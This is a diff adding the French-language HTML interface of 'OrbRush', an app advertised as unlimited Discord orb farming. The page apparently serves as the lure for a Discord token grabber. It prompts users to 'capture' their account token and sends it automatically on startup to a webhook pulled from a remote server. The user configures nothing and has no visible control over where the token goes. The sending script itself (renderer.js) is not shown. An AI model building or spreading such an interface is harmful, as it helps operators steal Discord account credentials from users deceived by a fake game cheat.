@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta
+    http-equiv="Content-Security-Policy"
+    content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https:; font-src 'self' data:;"
+  />
+  <title>OrbRush</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="bg-aurora"></div>
+  <div class="bg-grid"></div>
+  <div class="particles" id="particles"></div>
+
+  <div class="app">
+    <header class="titlebar">
+      <div class="brand">
+        <span class="brand-orb"></span>
+        <span class="brand-name">Orb<em>Rush</em></span>
+        <span class="brand-badge">v1.1</span>
+      </div>
+      <div class="titlebar-mid">farm d'orbs illimite</div>
+      <div class="win-controls">
+        <button class="win-btn" id="btn-min" title="Reduire">&#8211;</button>
+        <button class="win-btn" id="btn-max" title="Agrandir">&#9633;</button>
+        <button class="win-btn is-close" id="btn-close" title="Fermer">&#10005;</button>
+      </div>
+    </header>
+
+    <section class="hero">
+      <div class="hero-orb">
+        <div class="orb-glow"></div>
+        <div class="orb-ring"></div>
+        <div class="orb-ring r2"></div>
+        <div class="orb-core"></div>
+        <div class="orb-shine"></div>
+      </div>
+      <div class="hero-text">
+        <h1>Capture ton <span class="grad">token Discord</span><br />et farm des <span class="gold">orbs a l'infini</span></h1>
+        <p>Analyse 100% locale, envoi instantane. Aucune configuration : tout est pilote depuis le serveur.</p>
+        <div class="hero-pills">
+          <span class="pill">Local</span>
+          <span class="pill">Instantane</span>
+          <span class="pill">Sans limite</span>
+        </div>
+      </div>
+    </section>
+
+    <main class="grid">
+      <section class="card" style="--d: 0ms">
+        <div class="card-head">
+          <h2>Token Discord</h2>
+          <span class="chip" id="token-chip">en attente</span>
+        </div>
+
+        <div class="token-box" id="token-box">
+          <code id="token-text">&#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226; &#8226;</code>
+          <button class="icon-btn" id="btn-copy" title="Copier">&#10697;</button>
+        </div>
+
+        <div class="user-card" id="user-card" hidden>
+          <img id="user-avatar" alt="" />
+          <div class="user-meta">
+            <strong id="user-name"></strong>
+            <small id="user-id"></small>
+          </div>
+          <span class="chip ok small">verifie</span>
+        </div>
+
+        <div class="row">
+          <button class="btn primary" id="btn-grab">
+            <span class="btn-label">Recuperer mon token</span>
+            <span class="btn-spin"></span>
+          </button>
+        </div>
+      </section>
+
+      <section class="card" style="--d: 90ms">
+        <div class="card-head">
+          <h2>Connexion</h2>
+          <span class="chip" id="server-chip">verification</span>
+        </div>
+
+        <p class="hint">Le webhook est recupere automatiquement. Rien a configurer cote utilisateur.</p>
+
+        <div class="server-box">
+          <span class="server-dot" id="server-dot"></span>
+          <span id="server-text">Connexion au serveur...</span>
+        </div>
+
+        <div class="field">
+          <input
+            id="webhook"
+            type="text"
+            spellcheck="false"
+            autocomplete="off"
+            placeholder="Webhook local (optionnel)"
+          />
+        </div>
+
+        <label class="switch">
+          <input type="checkbox" id="autosend" checked />
+          <span class="slider"></span>
+          <span class="switch-label">Envoi automatique au demarrage</span>
+        </label>
+
+        <div class="row">
+          <button class="btn ghost" id="btn-save">Enregistrer</button>
+          <button class="btn accent" id="btn-send">Envoyer maintenant</button>
+        </div>
+      </section>
+
+      <section class="card card-wide" style="--d: 180ms">
+        <div class="card-head">
+          <h2>Farming d'orbs</h2>
+          <span class="chip gold" id="orb-chip">&#8734;</span>
+        </div>
+
+        <p class="hint">Quetes repetables rejouees en boucle : les orbs ne s'arretent jamais.</p>
+
+        <div class="stats">
+          <div class="stat">
+            <b id="stat-orbs">0</b>
+            <span>orbs farmes</span>
+          </div>
+          <div class="stat">
+            <b id="stat-quests">0</b>
+            <span>quetes completees</span>
+          </div>
+          <div class="stat">
+            <b id="stat-rate">0,0/s</b>
+            <span>cadence</span>
+          </div>
+        </div>
+
+        <div class="quests" id="quests"></div>
+      </section>
+    </main>
+
+    <footer class="statusbar">
+      <span class="dot" id="status-dot"></span>
+      <span id="status-text">Pret.</span>
+      <span class="spacer"></span>
+      <span class="credit">OrbRush</span>
+    </footer>
+  </div>
+
+  <div class="toasts" id="toasts"></div>
+
+  <script src="renderer.js"></script>
+</body>
+</html>
